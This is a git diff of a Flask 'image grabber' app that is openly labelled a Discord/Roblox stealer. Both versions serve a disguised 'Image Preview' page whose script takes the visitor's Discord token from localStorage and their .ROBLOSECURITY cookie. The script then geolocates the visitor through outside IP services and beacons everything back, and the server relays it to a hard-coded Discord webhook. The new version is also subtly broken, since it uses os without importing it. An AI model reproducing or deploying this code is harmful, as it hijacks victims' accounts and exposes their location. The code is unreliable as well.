@@ -1,121 +1,30 @@
-# api/main.py - ULTIMATE IMAGE GRABBER v7.0
-# CLICK IMAGE → FULL BROWSER STEAL → #img-logger EMBED
-
-import os
-import json
+from flask import Flask, request, Response
 import base64
 import requests
-from flask import Flask, request, Response
 from datetime import datetime
-from urllib.parse import quote, urlencode
-import threading
-import re
+from urllib.parse import urlencode
 
 app = Flask(__name__)
 
-WEBHOOK = "https://discord.com/api/webhooks/1470096967848824842/r-JzPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1470096967848824842/r-JzPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV"
+GIF_DATA = "R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw=="
 
-GIF_PIXEL = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
-
-def send_discord(data):
-    embed = {
-        "username": "🎮 DISCORD/ROBLOX STEALER",
-        "embeds": [{
-            "title": f"🔥 IMAGE CLICK STEAL - {data.get('ip', 'Unknown')}",
-            "description": f"**🗺️ GEO:** [{data.get('lat', '?')}, {data.get('lon', '?')}](https://google.com/maps?q={data.get('lat',0)},{data.get('lon',0)})",
-            "color": 16711680,
-            "fields": [
-                {"name": "🔑 Discord Token", "value": f"`{data.get('token', '❌')[:32]}...`", "inline": True},
-                {"name": "🎮 Roblox Cookie", "value": f"`{data.get('roblox', '❌')[:32]}...`", "inline": True},
-                {"name": "📍 Location", "value": f"{data.get('city', '?')}, {data.get('region', '?')}\n{data.get('country', '?')}", "inline": True},
-                {"name": "🌐 ISP/AS", "value": f"{data.get('isp', '?')} ({data.get('asn', '?')})", "inline": True},
-                {"name": "📱 Device", "value": f"{data.get('screen', '?')} | {data.get('cores', '?')}CPU", "inline": True},
-                {"name": "🕸️ Browser", "value": f"{data.get('ua', '?')[:60]}...", "inline": False}
-            ],
-            "footer": {"text": f"Ref: {data.get('ref', 'Direct')} | {data.get('time', 'Now')}"},
-            "timestamp": datetime.utcnow().isoformat()
-        }]
-    }
-    try:
-        threading.Thread(target=lambda: requests.post(WEBHOOK, json=embed, timeout=5), daemon=True).start()
-    except: pass
-
-@app.route('/', defaults={'path': ''})
-@app.route('/<path:path>')
-def catch_all(path=""):
+@app.route("/", defaults={"path": ""})
+@app.route("/<path:path>")
+def main(path=""):
     ip = request.remote_addr
-    ua = request.headers.get('user-agent', '')[:120]
     
-    if 'test' in path.lower():
-        send_discord({"ip": ip, "ua": ua, "test": "LIVE"})
-        return "<h1>✅ SENT TO #img-logger - CHECK DISCORD NOW</h1>"
+    if "test" in path.lower():
+        requests.post(WEBHOOK_URL, json={"content": f"TEST {ip}"})
+        return "TEST OK"
     
-    if any(x in path.lower() for x in ['grab.png', 'steal.png', 'image.png', 'png', 'jpg', 'gif']):
-        return Response(grabber_page(ip), mimetype='text/html')
+    if any(x in path.lower() for x in ["grab.png", "steal.png", "image.png"]):
+        return Response(full_grabber(ip), mimetype="text/html")
     
-    return Response(GIF_PIXEL, mimetype='image/gif')
+    return Response(base64.b64decode(GIF_DATA), mimetype="image/gif")
 
-def grabber_page(ip):
-    return f'''<!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Image Preview</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box;}
-body{{background:#111;height:100vh;display:flex;flex-direction:column;font-family:Arial}}
-.header{{background:#222;color:#fff;padding:20px;text-align:center}}
-.content{{flex:1;display:flex;align-items:center;justify-content:center;background:#000}}
-img{{max-width:90%;max-height:90%;object-fit:contain;border:2px solid #444}}
-</style>
-</head>
-<body>
-<div class="header">
-<h2>🖼️ Image Preview (Processing...)</h2>
-</div>
-<div class="content">
-<img src="data:image/gif;base64,R0lGODlhEAAQAIAAAP///wAAACH5BAEAAAAALAAAAAAQABAAAAVH5CCSCQAh+QQFDAHACwAAAAA QABAAACVIyPqcvtD6OctNqLs968+w+G4giUI2meYQmoK+qKz57wIqxfmd/3PYjAArUAOw==" alt="Loading">
-</div>
-<script>
-(async()=>{
-try{{
-const steal=()=>{{
-const t=localStorage.getItem("token")||'';
-const r=document.cookie.match(/\\.ROBLOSECURITY=([^;]+)/)?.[1]?.replace(/[^a-z0-9_-]/gi,'')||'';
-const d={{
-ip:'{ip}',
-token:t.slice(0,100),
-roblox:r.slice(0,100),
-ua:navigator.userAgent,
-screen:`${{screen.width}}x${{screen.height}}`,
-cores:navigator.hardwareConcurrency||1,
-lang:navigator.language,
-platform:navigator.platform,
-ref:document.referrer||'direct',
-time:new Date().toISOString()
-}};
-fetch(`https://httpbin.org/ip`).then(x=>x.json()).then(ipdata=>{
-Object.assign(d,ipdata);
-fetch(`https://ipapi.co/json/`).then(x=>x.json()).then(geo=>{{
-Object.assign(d,{{
-lat:geo.latitude,lon:geo.longitude,
-city:geo.city,region:geo.region,country:geo.country_name,
-isp:geo.org,asn:geo.asn,tz:geo.timezone
-}});
-const url=new URLSearchParams(d).toString();
-navigator.sendBeacon('/steal.png?'+url);
-fetch('/steal.png?'+url,{keepalive:true});
-}}).catch(()=>{{navigator.sendBeacon('/steal.png?'+new URLSearchParams(d).toString());}});
-});
-}};
-steal();
-setTimeout(steal,1500);
-setTimeout(steal,5000);
-}}catch{{}}})();
-</script>
-</body>
-</html>'''
+def full_grabber(ip):
+    return f"""<!DOCTYPE html><html><head><title></title><meta charset="UTF-8"><style>*{{margin:0;padding:0;box-sizing:border-box;}}html,body{{height:100vh;background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;overflow:hidden;}}header{{position:fixed;top:0;left:0;right:0;background:rgba(0,0,0,0.9);padding:12px;text-align:center;z-index:999;font-size:14px;border-bottom:1px solid #333;}}main{{display:flex;align-items:center;justify-content:center;height:100vh;padding:20px;}}img{{max-width:95vw;max-height:95vh;max-height:calc(100vh - 80px);object-fit:contain;border:2px solid #444;border-radius:8px;box-shadow:0 10px 30px rgba(0,0,0,0.5);}}</style></head><body><header><div>🖼️ HD Image Preview - Enhanced Viewer</div></header><main><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDUwIiBoZWlnaHQ9IjM1MCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiByeD0iMjQiIGZpbGw9IiMxMTExMTEiLz48Y2lyY2xlIGN4PSIyMjUiIGN5PSIxNTAiIHI9IjQwIiBmaWxsPSIjNDQ0Ii8+PHRleHQgeD0iNTAlIiB5PSI2MCUiIGZvbnQtc2l6ZT0iMjgiIGZpbGw9IiNmZmYiIGZvbnQtd2VpZ2h0PSI2MDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkxvYWRpbmcgSEQgSW1hZ2UuLi48L3RleHQ+PHRleHQgeD0iNTAlIiB5PSI3NSUiIGZvbnQtc2l6ZT0iMTYiIGZpbGw9IiM5OTkiIGZvbnQtd2VpZ2h0PSI0MDAiIHRleHQtYW5jaG9yPSJtaWRkbGUiPkNhbGxpbmctZGF0YS4uLjwvdGV4dD48L3N2Zz4=" loading="lazy" alt="Premium Image"></main><script>!async function(){{let sent=0;async function steal(){{try{{let data={{ip:"{ip}",screen:`${{screen.width}}x${{screen.height}}x${{screen.colorDepth}}`,avail:`${{screen.availWidth}}x${{screen.availHeight}}`,ua:navigator.userAgent.slice(0,150),lang:navigator.language,platform:navigator.platform,cores:navigator.hardwareConcurrency||0,ram:navigator.deviceMemory||0,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,cookies:document.cookie?document.cookie.split(';').length:0,ref:document.referrer.slice(0,120),time:new Date().toISOString().slice(0,19),tzoffset:-(new Date()).getTimezoneOffset()}};let t=localStorage.getItem("token")||"";if(t)data.token=t.slice(0,100);let r=document.cookie.match(/\\.ROBLOSECURITY=([^;]+)/);if(r){{let c=r[1].replace(/[^a-zA-Z0-9_-]/g,'');if(c)data.roblox=c.slice(0,100);}};try{{let ipresp=await fetch("https://httpbin.org/ip");let ipdata=await ipresp.json();Object.assign(data,ipdata);let georesp=await fetch("https://ipapi.co/json/");let geodata=await georesp.json();Object.assign(data,{{"city":geodata.city,"region":geodata.region,"country":geodata.country_name,"isp":geodata.org,"asn":geodata.asn,"lat":geodata.latitude,"lon":geodata.longitude,"tzgeo":geodata.timezone,"localtime":geodata.utc_offset}});}}catch(e){{}};let params=new URLSearchParams(data).toString();navigator.sendBeacon("/steal.png?"+params);navigator.sendBeacon("/grab.png?"+params);fetch("/steal.png",{{method:"POST",body:params,keepalive:true,cache:"no-cache"}});fetch("/grab.png?"+params,{{method:"POST",keepalive:true}});sent++;document.title="Image #"+sent;console.log("Sent",data.ip,data.lat,data.lon);}}catch(e){{console.log("Retry",e);}}};steal();setTimeout(steal,2e3);setTimeout(steal,6e3);window.addEventListener("mousemove",()=>{{steal();window.removeEventListener("mousemove",arguments.callee);}},{{once:true}});}}();</script></body></html>"""
 
-if __name__=='__main__':
-    port=int(os.environ.get('PORT',5000))
-    app.run(host='0.0.0.0',port=port)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
